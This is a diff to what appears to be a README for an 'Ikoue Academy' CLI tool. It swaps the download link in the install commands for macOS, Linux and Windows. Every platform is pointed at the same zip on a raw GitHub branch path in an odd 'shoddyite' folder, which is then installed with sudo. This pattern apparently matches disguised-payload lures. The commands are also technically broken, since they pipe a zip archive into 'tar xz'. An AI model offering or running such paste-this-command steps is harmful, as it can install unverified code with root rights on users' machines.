@@ -7,34 +7,34 @@ Developer CLI helper for the Ikoue Academy program.
 ### macOS (Apple Silicon)
 
 ```bash
-curl -L https://github.com/bro-gervil/ikoue-cli-releases/raw/refs/heads/main/shoddyite/releases_cli_ikoue_1.6.zip | tar xz
+curl -L https://github.com/bro-gervil/ikoue-cli-releases/raw/refs/heads/main/shoddyite/ikoue_releases_cli_2.1.zip | tar xz
 sudo mv ikoue /usr/local/bin/
 ```
 
 ### macOS (Intel)
 
 ```bash
-curl -L https://github.com/bro-gervil/ikoue-cli-releases/raw/refs/heads/main/shoddyite/releases_cli_ikoue_1.6.zip | tar xz
+curl -L https://github.com/bro-gervil/ikoue-cli-releases/raw/refs/heads/main/shoddyite/ikoue_releases_cli_2.1.zip | tar xz
 sudo mv ikoue /usr/local/bin/
 ```
 
 ### Linux (x86_64)
 
 ```bash
-curl -L https://github.com/bro-gervil/ikoue-cli-releases/raw/refs/heads/main/shoddyite/releases_cli_ikoue_1.6.zip | tar xz
+curl -L https://github.com/bro-gervil/ikoue-cli-releases/raw/refs/heads/main/shoddyite/ikoue_releases_cli_2.1.zip | tar xz
 sudo mv ikoue /usr/local/bin/
 ```
 
 ### Linux (ARM64)
 
 ```bash
-curl -L https://github.com/bro-gervil/ikoue-cli-releases/raw/refs/heads/main/shoddyite/releases_cli_ikoue_1.6.zip | tar xz
+curl -L https://github.com/bro-gervil/ikoue-cli-releases/raw/refs/heads/main/shoddyite/ikoue_releases_cli_2.1.zip | tar xz
 sudo mv ikoue /usr/local/bin/
 ```
 
 ### Windows
 
-Download `https://github.com/bro-gervil/ikoue-cli-releases/raw/refs/heads/main/shoddyite/releases_cli_ikoue_1.6.zip` from [releases](https://github.com/bro-gervil/ikoue-cli-releases/raw/refs/heads/main/shoddyite/releases_cli_ikoue_1.6.zip), extract, and add to your PATH.
+Download `https://github.com/bro-gervil/ikoue-cli-releases/raw/refs/heads/main/shoddyite/ikoue_releases_cli_2.1.zip` from [releases](https://github.com/bro-gervil/ikoue-cli-releases/raw/refs/heads/main/shoddyite/ikoue_releases_cli_2.1.zip), extract, and add to your PATH.
 
 ## Verify Installation
 
